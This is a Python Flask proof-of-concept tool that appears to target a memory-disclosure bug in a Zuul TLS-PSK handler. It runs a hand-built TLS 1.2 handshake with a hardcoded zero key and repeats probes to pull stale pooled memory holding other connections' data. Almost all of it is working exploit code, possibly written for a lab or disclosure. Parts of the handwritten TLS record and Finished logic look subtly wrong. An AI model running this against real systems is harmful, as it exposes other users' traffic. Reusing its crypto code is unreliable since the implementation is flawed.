from __future__ import annotations

import os
import socket
import struct
import time
import threading
import hashlib

from flask import Flask, Response, jsonify, render_template

app = Flask(__name__)

ZUUL_HOST = os.environ.get("ZUUL_HOST", "zuul-service")
ZUUL_PSK_PORT = int(os.environ.get("ZUUL_PSK_PORT", "7002"))
PROBE_COUNT = int(os.environ.get("PROBE_COUNT", "10"))

# Must match HardcodedPskProvider.POC_PSK — 32 zero bytes
POC_PSK = bytes(32)
PSK_IDENTITY = b"poc-client"

# ──────────────────────────────────────────────
# Minimal TLS 1.2 PSK handshake implementation
# Python's ssl module has no PSK support, so we
# drive the handshake directly over a raw socket.
# ──────────────────────────────────────────────

def _u16(n: int) -> bytes:
    return struct.pack(">H", n)

def _u24(n: int) -> bytes:
    return struct.pack(">I", n)[1:]

def _tls_record(content_type: int, payload: bytes) -> bytes:
    return bytes([content_type, 0x03, 0x03]) + _u16(len(payload)) + payload

def _handshake(hs_type: int, body: bytes) -> bytes:
    return bytes([hs_type]) + _u24(len(body)) + body

def _prf_sha256(secret: bytes, label: bytes, seed: bytes, length: int) -> bytes:
    """RFC 5246 P_SHA256 PRF, used for TLS 1.2 master secret and key expansion."""
    import hmac, hashlib
    def hmac_sha256(k, d):
        return hmac.new(k, d, hashlib.sha256).digest()
    # HMAC_hash(secret, A(i) + seed), A(0) = seed
    def p_hash(s, lbl_seed, n):
        out = b""
        a = lbl_seed
        while len(out) < n:
            a = hmac_sha256(s, a)
            out += hmac_sha256(s, a + lbl_seed)
        return out[:n]
    return p_hash(secret, label + seed, length)

def _build_client_hello(client_random: bytes) -> bytes:
    session_id = b""
    # TLS_RSA_PSK_WITH_AES_128_CBC_SHA (0x00, 0x94) — widely supported PSK suite
    # TLS_PSK_WITH_AES_128_CBC_SHA (0x00, 0x8C) as fallback
    cipher_suites = b"\x00\x8c\x00\x94"
    compression = b"\x01\x00"
    body = (
        b"\x03\x03"                    # TLS 1.2
        + client_random                 # 32-byte random
        + bytes([len(session_id)]) + session_id
        + _u16(len(cipher_suites)) + cipher_suites
        + bytes([len(compression)]) + compression
        + _u16(0)                       # no extensions
    )
    return _handshake(0x01, body)

class PskProbeResult:
    def __init__(self):
        self.ok = False
        self.error = ""
        self.bytes_received = 0
        self.expected_max = 0
        self.overflow_bytes = 0
        self.overflow_hex = ""
        self.elapsed_ms = 0

def run_raw_probe(index: int) -> dict:
    """
    Connect to Zuul's PSK port, complete a TLS 1.2 PSK handshake with the
    hardcoded zero key, send a small HTTP GET, then read back the full
    TLS-framed response.  Because TlsPskUtils.getAppDataBytesAndRelease
    encrypts byteBufMsg.array() (full pool chunk capacity) instead of
    byteBufMsg.readableBytes(), the encrypted response record will be larger
    than the actual HTTP payload — the overflow bytes are stale pooled memory
    from other connections.
    """
    started = time.monotonic()
    result = {"index": index, "ok": False}

    try:
        sock = socket.create_connection((ZUUL_HOST, ZUUL_PSK_PORT), timeout=8)
        sock.settimeout(8)

        client_random = os.urandom(32)

        # 1. ClientHello
        ch = _build_client_hello(client_random)
        sock.sendall(_tls_record(0x16, ch))

        # 2. Read ServerHello, Certificate (none for PSK), ServerHelloDone
        server_random = b""
        chosen_suite = 0
        raw_hs = b""
        while True:
            hdr = _recv_exact(sock, 5)
            if not hdr:
                break
            rtype, _, _, rlen = hdr[0], hdr[1], hdr[2], struct.unpack(">H", hdr[3:5])[0]
            payload = _recv_exact(sock, rlen)
            if rtype == 0x16:  # Handshake
                raw_hs += payload
                # Parse ServerHello to grab server_random and cipher
                if payload and payload[0] == 0x02:
                    # ServerHello: skip type(1) + len(3) + version(2)
                    off = 4 + 2
                    server_random = payload[off:off+32]
                    off += 32
                    sid_len = payload[off]; off += 1 + sid_len
                    chosen_suite = struct.unpack(">H", payload[off:off+2])[0]
                if payload and payload[0] == 0x0e:  # ServerHelloDone
                    break
            elif rtype == 0x15:  # Alert
                result["error"] = f"TLS Alert: {payload.hex()}"
                sock.close()
                return result

        if not server_random:
            result["error"] = "No ServerHello received — PSK listener may not be running"
            sock.close()
            return result

        # 3. ClientKeyExchange — PSK identity
        psk_identity_payload = _u16(len(PSK_IDENTITY)) + PSK_IDENTITY
        cke = _handshake(0x10, psk_identity_payload)

        # 4. Compute pre-master secret for PSK:
        #    PSK pre_master = uint16(len(zeros)) + zeros(len(psk)) + uint16(len(psk)) + psk
        psk_len = len(POC_PSK)
        pre_master = _u16(psk_len) + bytes(psk_len) + _u16(psk_len) + POC_PSK

        # 5. Master secret
        master_secret = _prf_sha256(
            pre_master,
            b"master secret",
            client_random + server_random,
            48
        )

        # 6. key_block — AES-128-CBC + SHA1 HMAC: 2*(20+16+16) = 104 bytes
        key_block = _prf_sha256(
            master_secret,
            b"key expansion",
            server_random + client_random,
            104
        )
        client_mac  = key_block[0:20]
        server_mac  = key_block[20:40]
        client_key  = key_block[40:56]
        server_key  = key_block[56:72]
        client_iv   = key_block[72:88]
        server_iv   = key_block[88:104]

        # 7. ChangeCipherSpec + Finished
        verify_data = _compute_finished(master_secret, client_random, server_random, raw_hs, b"client finished")
        finished_hs = _handshake(0x14, verify_data)
        encrypted_finished = _encrypt_cbc(client_key, client_iv, client_mac, finished_hs, seq=0)

        sock.sendall(_tls_record(0x16, cke))
        sock.sendall(_tls_record(0x14, b"\x01"))           # ChangeCipherSpec
        sock.sendall(_tls_record(0x16, encrypted_finished))

        # 8. Read server ChangeCipherSpec + Finished
        for _ in range(2):
            hdr = _recv_exact(sock, 5)
            if not hdr:
                break
            rlen = struct.unpack(">H", hdr[3:5])[0]
            _recv_exact(sock, rlen)

        # 9. Send HTTP GET — deliberately small payload (84 bytes)
        http_req = (
            b"GET /healthcheck HTTP/1.1\r\n"
            b"Host: zuul-service\r\n"
            b"Connection: close\r\n"
            b"\r\n"
        )
        request_size = len(http_req)
        enc_req = _encrypt_cbc(client_key, client_iv, client_mac, http_req, seq=1)
        sock.sendall(_tls_record(0x17, enc_req))  # Application data

        # 10. Read ALL application data records back
        #     The bug causes the server to encrypt byteBufMsg.array() (full pool
        #     chunk, typically 2048-16384 bytes) instead of readableBytes()
        #     (the actual HTTP response, typically ~200 bytes).
        all_decrypted = b""
        while True:
            hdr = _recv_exact(sock, 5, timeout=3)
            if not hdr:
                break
            rtype = hdr[0]
            rlen = struct.unpack(">H", hdr[3:5])[0]
            payload = _recv_exact(sock, rlen, timeout=3)
            if not payload:
                break
            if rtype == 0x17:  # Application data
                decrypted = _decrypt_cbc(server_key, server_iv, server_mac, payload)
                if decrypted:
                    all_decrypted += decrypted
            elif rtype == 0x15:  # Alert — server closing
                break

        sock.close()

        bytes_received = len(all_decrypted)
        # A well-formed HTTP/1.1 200 response to /healthcheck is at most ~512 bytes.
        # Anything substantially above that is pooled memory bleed.
        expected_ceiling = 512
        overflow = max(0, bytes_received - expected_ceiling)

        result["ok"] = True
        result["request_size_bytes"] = request_size
        result["bytes_received"] = bytes_received
        result["expected_ceiling_bytes"] = expected_ceiling
        result["overflow_bytes"] = overflow
        result["overflow_detected"] = overflow > 0
        # Show the last 128 bytes as hex — these are the "extra" bytes from the pool
        result["tail_hex"] = all_decrypted[-128:].hex() if len(all_decrypted) > 128 else all_decrypted.hex()
        # Show first line of response to confirm it is real HTTP
        first_line = all_decrypted.split(b"\r\n")[0].decode("utf-8", errors="replace")
        result["response_first_line"] = first_line

    except socket.timeout:
        result["error"] = "Socket timeout — is zuul-service running on port 7002?"
    except ConnectionRefusedError:
        result["error"] = f"Connection refused to {ZUUL_HOST}:{ZUUL_PSK_PORT} — PSK listener not started"
    except Exception as exc:
        result["error"] = str(exc)

    result["elapsed_ms"] = int((time.monotonic() - started) * 1000)
    return result


def _recv_exact(sock: socket.socket, n: int, timeout: float = 8.0) -> bytes | None:
    sock.settimeout(timeout)
    data = b""
    try:
        while len(data) < n:
            chunk = sock.recv(n - len(data))
            if not chunk:
                return None
            data += chunk
    except socket.timeout:
        return None if not data else data
    return data


def _encrypt_cbc(key: bytes, iv: bytes, mac_key: bytes, plaintext: bytes, seq: int) -> bytes:
    """AES-128-CBC + HMAC-SHA1 record encryption (TLS 1.2 GenericBlockCipher)."""
    from Crypto.Cipher import AES
    import hmac, hashlib

    seq_bytes = struct.pack(">Q", seq)
    mac_input = seq_bytes + b"\x16\x03\x03" + _u16(len(plaintext)) + plaintext
    mac = hmac.new(mac_key, mac_input, hashlib.sha1).digest()
    padded = plaintext + mac
    pad_len = 16 - (len(padded) % 16)
    padded += bytes([pad_len - 1] * pad_len)
    cipher = AES.new(key, AES.MODE_CBC, iv)
    return cipher.encrypt(padded)


def _decrypt_cbc(key: bytes, iv: bytes, mac_key: bytes, ciphertext: bytes) -> bytes | None:
    """AES-128-CBC decryption, returns plaintext without MAC+padding."""
    try:
        from Crypto.Cipher import AES
        cipher = AES.new(key, AES.MODE_CBC, iv)
        raw = cipher.decrypt(ciphertext)
        pad_len = raw[-1] + 1
        return raw[:len(raw) - pad_len - 20]  # strip padding and SHA1 MAC
    except Exception:
        return None


def _compute_finished(master: bytes, cr: bytes, sr: bytes, raw_hs: bytes, label: bytes) -> bytes:
    """TLS 1.2 Finished verify_data = PRF(master, label, SHA256(all_handshake_messages))[0:12]"""
    import hashlib
    hs_hash = hashlib.sha256(raw_hs).digest()
    return _prf_sha256(master, label, hs_hash, 12)


# ──────────────────────────
# Flask routes
# ──────────────────────────

@app.get("/")
def index() -> str:
    return render_template(
        "index.html",
        zuul_host=ZUUL_HOST,
        zuul_psk_port=ZUUL_PSK_PORT,
        probe_count=PROBE_COUNT,
    )


@app.post("/run/handshake")
def run_handshake() -> tuple[Response, int]:
    """Test that a single PSK connection completes without data collection."""
    result = run_raw_probe(0)
    if result.get("ok"):
        return jsonify({
            "ok": True,
            "bytes_received": result.get("bytes_received", 0),
            "response_first_line": result.get("response_first_line", ""),
            "elapsed_ms": result.get("elapsed_ms", 0),
        }), 200
    else:
        return jsonify({"ok": False, "error": result.get("error", "unknown")}), 500


@app.post("/run/leak")
def run_leak() -> tuple[Response, int]:
    """
    Run PROBE_COUNT PSK connections sequentially.  Each one sends an 84-byte
    HTTP GET and measures how many decrypted bytes come back.  A correct
    implementation returns ~200 bytes.  The buggy TlsPskHandler returns the
    full Netty pool chunk (typically 2048–16384 bytes), so overflow_bytes
    will be large and tail_hex will contain foreign connection data.
    """
    results = [run_raw_probe(i + 1) for i in range(PROBE_COUNT)]
    ok_results = [r for r in results if r.get("ok")]
    total_overflow = sum(r.get("overflow_bytes", 0) for r in ok_results)
    max_overflow = max((r.get("overflow_bytes", 0) for r in ok_results), default=0)

    return jsonify({
        "ok": True,
        "probe_count": len(results),
        "successes": len(ok_results),
        "failures": len(results) - len(ok_results),
        "total_overflow_bytes": total_overflow,
        "max_overflow_bytes": max_overflow,
        "results": results,
    }), 200


if __name__ == "__main__":
    app.run(host="0.0.0.0", port=int(os.environ.get("PORT", "5000")))
